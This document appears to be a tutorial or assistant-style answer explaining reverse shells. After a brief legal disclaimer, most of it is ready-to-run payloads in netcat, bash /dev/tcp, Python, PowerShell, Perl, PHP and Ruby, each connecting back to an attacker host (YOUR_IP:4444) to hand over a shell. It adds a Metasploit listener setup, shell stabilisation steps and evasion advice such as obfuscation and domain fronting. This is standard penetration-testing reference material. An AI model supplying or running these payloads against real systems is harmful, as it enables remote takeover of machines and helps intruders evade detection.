**A reverse shell** is a technique where a target (compromised) machine initiates an outbound connection back to your
(attacker/listener) machine, giving you shell access. It is commonly used in penetration testing, red teaming, CTFs, and
post-exploitation.

**Important legal and ethical warning**: Only use this on systems you own or have explicit written permission to test.
Unauthorized use is illegal in most jurisdictions and can result in serious consequences. This is for educational and
authorized security testing purposes only.

### Basic Concept

1. **Listener** (your machine): Runs a server that waits for the incoming connection.
2. **Payload** (target machine): Runs code that connects back to your listener and pipes a shell (e.g., `/bin/sh` or
   `cmd.exe`) over the connection.

### Common Methods

#### 1. Netcat (most simple, often available on Linux)

**On your listener machine:**

```bash
nc -lvnp 4444
```

(`-l` listen, `-v` verbose, `-n` no DNS, `-p` port)

**On the target (one-liner reverse shell):**

```bash
nc -e /bin/sh YOUR_IP 4444
```

Or if `-e` is not available (common on modern netcat):

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f
```

#### 2. Bash (no extra tools needed on many Linux systems)

**Target:**

```bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

#### 3. Python (very reliable, cross-platform)

**Target:**

```python
python3 -c '
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("YOUR_IP",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
'
```

#### 4. PowerShell (Windows)

**Target:**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### 5. Other quick options

- **Perl**:
  `perl -e 'use Socket;$i="YOUR_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
- **PHP**: `php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");' 3<>/dev/tcp/YOUR_IP/4444`
- **Ruby**:
  `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("YOUR_IP","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`

### Listener Tips

- Use `nc` as shown above.
- For a more stable experience, use `socat` or Metasploit's `multi/handler`.
- In Metasploit:
  ```bash
  msfconsole
  use exploit/multi/handler
  set payload linux/x64/meterpreter/reverse_tcp   # or windows one, etc.
  set LHOST YOUR_IP
  set LPORT 4444
  exploit
  ```

### Stabilization (once you have a shell)

Raw reverse shells are often unstable. Upgrade them:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then `Ctrl+Z`, `stty raw -echo; fg`, `export TERM=xterm`, and `stty rows COLUMNS` to match your terminal.

### Evasion / Advanced Notes

- Use encrypted channels (e.g., `socat` with OpenSSL, or Meterpreter).
- Change ports, use common ports (80/443), or domain fronting.
- Obfuscate the payload (base64, URL encoding, etc.).
- For Windows, consider `nishang`, `Invoke-PowerShellTcp`, or C#/.NET payloads.
